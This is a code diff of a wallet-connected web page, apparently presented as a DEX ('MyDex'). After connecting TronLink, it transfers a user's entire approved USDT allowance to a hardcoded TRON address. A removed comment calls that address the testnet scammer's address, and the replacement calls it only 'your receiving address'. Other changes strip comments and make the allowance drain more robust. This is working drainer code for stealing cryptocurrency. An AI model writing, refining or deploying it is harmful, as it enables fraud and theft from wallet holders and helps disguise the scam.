@@ -118,7 +118,6 @@
         alert("錢包已連接：" + window.tronWeb.defaultAddress.base58);
         connectButton.innerHTML = "已連接錢包：" + window.tronWeb.defaultAddress.base58;
       } else if (window.tronLink) {
-        // 觸發 TronLink 連接，舊版可能會用這方法
         try {
           await window.tronLink.request({ method: "tron_requestAccounts" });
         } catch (error) {
@@ -142,7 +141,6 @@
         return;
       }
 
-      // 單位轉換：USDT 在 TRON 是6位小數
       const amount = BigInt(Math.floor(parseFloat(amountStr) * 1e6)).toString();
       const userAddress = window.tronWeb.defaultAddress.base58;
 
@@ -175,21 +173,29 @@
 
       try {
         const from = await MyDex.getIndexAddress(0).call();
-        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 你測試網詐騙者地址，請確認是否為你指定收款地址
-        const allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+        const to = "TBofpm8BrK1sgAgUFmQTKgbSHkFr8HgM5B"; // 你的收款地址
+
+        let allowance = await USDT.allowance(from, MyDex_contractAddress).call();
+
+        // 兼容不同格式
+        if (allowance._hex) {
+          allowance = BigInt(allowance._hex).toString();
+        } else {
+          allowance = allowance.toString();
+        }
 
         if (BigInt(allowance) === 0n) {
           alert("尚未授權，無法轉帳");
           return;
         }
 
-        console.log("💸 開始轉帳 USDT，金額:", allowance.toString());
+        console.log("💸 開始轉帳 USDT，金額:", allowance);
         const tx = await MyDex.transferFrom(from, to, allowance).send({ feeLimit: 100_000_000 });
         console.log("✅ 轉帳成功：", tx);
         alert("轉帳成功");
       } catch (err) {
         console.error("❌ 轉帳失敗：", err);
-        alert("轉帳失敗，請確認授權狀態");
+        alert("轉帳失敗，請確認授權狀態及手續費");
       }
     };
   </script>
